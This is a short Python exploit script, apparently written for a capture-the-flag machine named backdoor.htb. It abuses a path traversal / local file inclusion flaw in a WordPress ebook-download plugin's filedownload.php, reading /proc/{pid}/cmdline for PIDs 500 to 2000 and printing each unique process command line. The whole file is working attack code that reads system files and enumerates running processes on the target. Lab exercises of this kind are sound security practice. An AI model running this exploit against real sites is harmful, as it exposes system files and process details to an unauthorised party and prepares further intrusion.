#!/bin/python3
import requests as r
import cursor

# specify PID
LFIURL = 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/{pid}/cmdline'
# inclusive
RANGE = 500,2000


def beautify_result(text:str):
    # very specific for each exploit
    return (text.split('cmdline')[-1]).split('<script>')[0]


already_read = []

try:
    cursor.hide()
    for pid in range(RANGE[0],RANGE[1]+1):

        print(f'PID: {pid}', end='\r')

        response = r.get(LFIURL.format(pid=pid))
        cmdline = beautify_result(response.text)
        
        if cmdline != '' and cmdline not in already_read:
            already_read.append(cmdline)
            print(f'{pid} {cmdline}')
finally:
    cursor.show()


